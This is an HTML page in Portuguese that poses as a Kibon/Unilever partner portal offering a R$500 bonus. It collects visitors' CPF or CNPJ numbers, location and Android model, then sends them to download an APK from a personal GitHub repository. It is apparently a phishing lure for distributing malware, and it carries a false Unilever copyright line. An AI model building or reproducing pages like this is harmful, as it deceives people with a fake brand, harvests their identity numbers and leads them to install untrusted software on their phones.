<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kibon - Parceiros</title>
    <style>
        :root { --vermelho: #e31b23; --amarelo: #ffcc00; --fundo: #f0f0f0; }
        body { font-family: sans-serif; background-color: var(--fundo); display: flex; flex-direction: column; align-items: center; margin: 0; padding: 20px; }
        
        .card { background: white; width: 100%; max-width: 450px; border-radius: 40px; padding: 40px 30px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-top: 30px; box-sizing: border-box; }
        
        .header-bonus { background: var(--vermelho); color: white; text-align: center; padding: 25px; border-radius: 20px; margin-bottom: 30px; }
        .header-bonus h2 { margin: 0; font-size: 24px; }
        .header-bonus p { margin: 5px 0 0; color: var(--amarelo); font-weight: bold; font-size: 14px; }
        
        label { display: block; font-weight: bold; margin-bottom: 8px; color: #444; font-size: 13px; text-transform: uppercase; }
        .form-group { margin-bottom: 20px; }
        
        input, select { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 15px; font-size: 16px; box-sizing: border-box; outline: none; background-color: #fff; }
        input:focus, select:focus { border-color: var(--vermelho); }
        
        .row { display: flex; gap: 15px; }
        .row div { flex: 1; }
        
        .btn-download { display: block; width: 100%; background: var(--vermelho); color: white; text-align: center; padding: 22px; text-decoration: none; border-radius: 50px; font-weight: bold; font-size: 18px; margin-top: 20px; box-shadow: 0 8px 15px rgba(227, 27, 35, 0.4); }
        
        .error-msg { color: var(--vermelho); font-size: 12px; font-weight: bold; display: none; margin-top: 5px; }
        footer { margin-top: 50px; color: #bbb; font-size: 11px; text-align: center; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="card">
    <div class="header-bonus">
        <h2>BÔNUS DE R$ 500,00</h2>
        <p>EXCLUSIVO PARA PARCEIROS</p>
    </div>

    <form id="formKibon">
        <div class="form-group">
            <label>Perfil Profissional</label>
            <select required>
                <option value="">Selecione seu perfil...</option>
                <option>Ponto de Venda (PDV)</option>
                <option>Dono de Estabelecimento</option>
            </select>
        </div>

        <div class="form-group">
            <label>CPF ou CNPJ (Apenas números)</label>
            <input type="text" id="documento" placeholder="Digite aqui..." maxlength="14" required>
            <span id="erroDoc" class="error-msg">⚠️ Documento inválido!</span>
        </div>

        <div class="row form-group">
            <div style="flex: 0.4;">
                <label>Estado</label>
                <select id="uf" required>
                    <option value="">UF</option>
                </select>
            </div>
            <div>
                <label>Cidade</label>
                <select id="cidade" required disabled>
                    <option value="">Selecione...</option>
                </select>
            </div>
        </div>

        <div class="form-group">
            <label>Modelo do seu Android</label>
            <select required>
                <option value="">Selecione o aparelho...</option>
                <option>Samsung Galaxy (S, A, M, Note)</option>
                <option>Motorola (Moto G, Edge, E)</option>
                <option>Xiaomi / Redmi / POCO</option>
                <option>Outros Android</option>
            </select>
        </div>

        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-download">
            BAIXAR APK E RESGATAR
        </a>
    </form>
</div>

<footer>© 2026 KIBON BRASIL - UNILEVER. TODOS OS DIREITOS RESERVADOS.</footer>

<script>
    const ufSelect = document.getElementById('uf');
    const cidadeSelect = document.getElementById('cidade');

    // 1. Carrega os Estados ao abrir a página
    fetch('https://servicodados.ibge.gov.br/api/v1/localidades/estados?orderBy=nome')
    .then(res => res.json())
    .then(estados => {
        estados.forEach(estado => {
            let opt = document.createElement('option');
            opt.value = estado.sigla;
            opt.text = estado.sigla;
            ufSelect.add(opt);
        });
    });

    // 2. Carrega as Cidades TODA VEZ que mudar o Estado
    ufSelect.addEventListener('change', function() {
        const estadoEscolhido = this.value;
        cidadeSelect.innerHTML = '<option value="">Carregando...</option>';
        cidadeSelect.disabled = true;

        if (estadoEscolhido) {
            fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${estadoEscolhido}/municipios?orderBy=nome`)
            .then(res => res.json())
            .then(cidades => {
                cidadeSelect.innerHTML = '<option value="">Selecione...</option>';
                cidades.forEach(cidade => {
                    let opt = document.createElement('option');
                    opt.value = cidade.nome;
                    opt.text = cidade.nome;
                    cidadeSelect.add(opt);
                });
                cidadeSelect.disabled = false;
            })
            .catch(err => {
                cidadeSelect.innerHTML = '<option value="">Erro ao carregar</option>';
            });
        }
    });
